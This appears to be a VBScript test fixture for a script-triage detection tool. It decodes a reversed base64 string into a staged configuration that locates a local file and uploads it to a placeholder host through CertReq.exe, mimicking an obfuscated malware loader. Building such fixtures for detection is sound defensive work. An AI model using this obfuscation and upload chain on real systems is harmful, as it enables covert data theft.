Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_d16753e8 = "ZWNkNDE4MDgvZGFvbHB1L2RpbGF2bmkuZWxwbWF4ZS43MzgwMWQ0ZThjLy86c3B0dGg9bHJ1X2Rhb2xwdXx0YWQuNzM4MDFkNGU4Yy1lZ2F0c1xiYUxzc2VydG51SFxjaWxidVBcc3Jlc1VcOkM9aHRhcF9lbGlmfDczODAxZDRlOGMvYmFMc3NlcnRudUg9dG5lZ2FfcmVzdXx0YWQuYjE4NzNiNjIvZGlsYXZuaS5lbHBtYXhlLjczODAxZDRlOGMvLzpzcHR0aD1scnV8NzM4MDFkNGU4Yy1uZ2lhcG1hYz1kaV9uZ2lhcG1hY3wyPXRudW9jX2VnYXRzfGV4ZS5xZVJ0cmVDPXJldHBhZGF8ZXRvbWVyX2Rhb2xwdSxyZWZzbmFydF9lcmFwZXJwLGxhY29sX2V0YWNvbD1zcGV0c3wxPXY="
Const Codec_d16753e8 = "base64_chunks|reverse_bytes|"

Function Base64_d16753e8(ByVal encodedText)
  Dim alphabet, cleanText, characterIndex, encodedCharacter, characterValue
  Dim outputBytes(), outputIndex, accumulator, bitCount
  alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  cleanText = Replace(Replace(encodedText, vbCr, ""), vbLf, "")
  ReDim outputBytes((Len(cleanText) * 3) \ 4)
  outputIndex = 0
  accumulator = 0
  bitCount = 0
  For characterIndex = 1 To Len(cleanText)
    encodedCharacter = Mid(cleanText, characterIndex, 1)
    If encodedCharacter <> "=" Then
      characterValue = InStr(1, alphabet, encodedCharacter, vbBinaryCompare) - 1
      If characterValue < 0 Then Err.Raise 5, "Base64_d16753e8", "Invalid Base64 character"
      accumulator = (accumulator * 64) + characterValue
      bitCount = bitCount + 6
    End If
    If bitCount >= 8 Then
      bitCount = bitCount - 8
      outputBytes(outputIndex) = (accumulator \ (2 ^ bitCount)) And 255
      outputIndex = outputIndex + 1
      If bitCount = 0 Then
        accumulator = 0
      Else
        accumulator = accumulator And ((2 ^ bitCount) - 1)
      End If
    End If
  Next
  ReDim Preserve outputBytes(outputIndex - 1)
  Base64_d16753e8 = outputBytes
End Function

Function Load_d16753e8()
  Dim partWidth, packedText
  partWidth = (Len(Material_d16753e8) + 3) \ 4
  packedText = Mid(Material_d16753e8, 1, partWidth) & Mid(Material_d16753e8, partWidth + 1, partWidth) & Mid(Material_d16753e8, partWidth * 2 + 1, partWidth) & Mid(Material_d16753e8, partWidth * 3 + 1)
  Load_d16753e8 = Base64_d16753e8(packedText)
End Function

Function Decode_d16753e8(ByRef s)
  Dim result(), i, keyBytes, previous
  ReDim result(UBound(s))
  For i = 0 To UBound(s)
    result(UBound(s) - i) = s(i)
  Next
  Decode_d16753e8 = result
End Function

Function Recover_d16753e8()
  Dim s, d, t, n, i, p, e, q
  If True Then
    n = Join(Array("north", "south"), ":")
      s = Load_d16753e8()
      Do
        d = Decode_d16753e8(s)
        Exit Do
      Loop
      t = ""
      For i = 0 To UBound(d)
        t = t & Chr(d(i))
      Next
  End If
  Recover_d16753e8 = t
End Function

Sub Copy_d16753e8(ByVal inputText, ByRef outputText)
  outputText = inputText
End Sub

Function Inspect_d16753e8()
  Dim resultText
  Call Copy_d16753e8(Recover_d16753e8(), resultText)
  Inspect_d16753e8 = resultText
End Function
